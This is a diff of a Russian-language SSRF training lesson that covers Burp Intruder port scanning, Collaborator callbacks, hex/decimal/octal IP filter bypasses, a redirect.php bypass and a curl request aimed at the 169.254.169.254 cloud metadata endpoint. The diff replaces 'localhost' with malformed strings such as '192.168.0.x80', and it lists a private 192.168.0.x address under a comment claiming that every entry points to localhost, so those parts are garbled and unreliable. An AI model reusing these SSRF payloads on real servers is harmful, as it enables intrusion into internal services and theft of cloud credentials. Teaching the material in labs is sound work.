@@ -8,7 +8,7 @@
 
 1. Веб-приложение принимает URL от пользователя (например, для загрузки аватара, проверки ссылки)
 2. Сервер выполняет запрос к этому URL
-3. Атакующий подставляет адрес внутреннего сервиса (например, `http://localhost:8080/admin`)
+3. Атакующий подставляет адрес внутреннего сервиса (например, `http://192.168.0.x80/admin`)
 4. Сервер выполняет запрос и возвращает ответ атакующему
 
 ### Что можно сделать через SSRF
@@ -60,7 +60,7 @@ POST /check-url HTTP/1.1
 Host: vulnerable.com
 Content-Type: application/x-www-form-urlencoded
 
-url=http://localhost/admin
+url=http://192.168.0.x/admin
 ```
 
 Если сервер вернул содержимое `/admin` — SSRF сработал.
@@ -68,7 +68,7 @@ url=http://localhost/admin
 **Шаг 3: Сканирование портов**
 Используйте Burp Intruder для перебора портов:
 ```
-url=http://localhost:§PORT§
+url=http://192.168.0.x:§PORT§
 ```
 Payloads: 22, 80, 443, 6379 (Redis), 9200 (Elasticsearch), 8080
 
@@ -95,7 +95,83 @@ url=http://127.1/admin        # сокращенный формат
 2. **Скриншот 2**: Burp Collaborator — получен HTTP/DNS запрос
 3. **Скриншот 3**: Сканирование портов — ответы от разных портов
 
+### Примеры вывода
+
+**Burp Collaborator — полученные запросы:**
+```
+DNS lookup for abc123.oastify.com from 1.2.3.4
+HTTP GET http://abc123.oastify.com/ from 1.2.3.4
+```
+
+**SSRF — сканирование портов через Intruder:**
+```
+Payload: http://192.168.0.x:22   → Timeout/Error (SSH)
+Payload: http://192.168.0.x   → 200 OK (HTTP)
+Payload: http://192.168.0.x:443  → 200 OK (HTTPS)
+Payload: http://192.168.0.x:6379 → Response (Redis)
+```
+
+**Обход фильтров — использование разных форматов IP:**
+```bash
+# Все эти адреса указывают на localhost:
+http://127.0.0.1/admin
+http://0x7f000001/admin        # Hex
+http://2130706433/admin        # Decimal
+http://0177.0.0.1/admin       # Octal
+http://192.168.0.x/admin
+```
+
+### Частые ошибки
+
+1. **Забыть про внутренние сервисы** — Redis, Elasticsearch, Admin панели часто не защищены
+2. **Игнорировать Blind SSRF** — даже без ответа атака может сработать (DNS callbacks)
+3. **Не использовать Burp Collaborator** — для проверки Blind SSRF это критично
+4. **Блокировка URL-схем** — иногда `file://`, `gopher://` тоже работают
+
+### Вопросы на понимание
+
+1. Почему SSRF позволяет атаковать внутренние сервисы?
+2. В чем разница между обычным и Blind SSRF?
+3. Как облачные метаданные (169.254.169.254) связаны с SSRF?
+4. Почему `gopher://` опасен при SSRF?
+
+### Адаптация под macOS (M2)
+
+```bash
+# Установка PortSwigger лаб на macOS (через Docker, работает на M2)
+docker run -d -p 8080:80 -p 8443:443 webscantest/owasp-webgoat-php
+
+# Использование curl для тестирования SSRF локально
+curl -s "http://192.168.0.x80/check-url?url=http://169.254.169.254/latest/meta-data/"
+
+# Python сервер для имитации внутреннего сервиса
+cat > /tmp/internal_service.py << 'EOF'
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Internal Admin Panel - Access Granted")
+        
+print("Internal service on 0.0.0.0:8888")
+HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
+EOF
+python3 /tmp/internal_service.py &
+```
+
 ---
+
+
+## Адаптация под macOS (M2, 8GB)
+
+- Для установки инструментов используйте Homebrew: `brew install <tool>`
+- На MacBook Air M2 (8GB) запускайте VM с памятью не более 3-4GB
+- Используйте UTM вместо VirtualBox (лучшая поддержка ARM)
+- Docker работает нативно на M2: `docker pull <image>`
+- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
+- Для Python используйте `pip3 install` вместо `pip install`
+
 
 ## Задачи для самостоятельного выполнения
 
@@ -110,7 +186,7 @@ url=http://127.1/admin        # сокращенный формат
 
 3. **Обход через redirect**: Научитесь обходить фильтры через redirect. Создайте простой скрипт `redirect.php`:
    ```php
-   <?php header("Location: http://localhost/admin"); ?>
+   <?php header("Location: http://192.168.0.x/admin"); ?>
    ```
    Используйте: `url=http://yourserver.com/redirect.php`. Сработал ли обход?
 
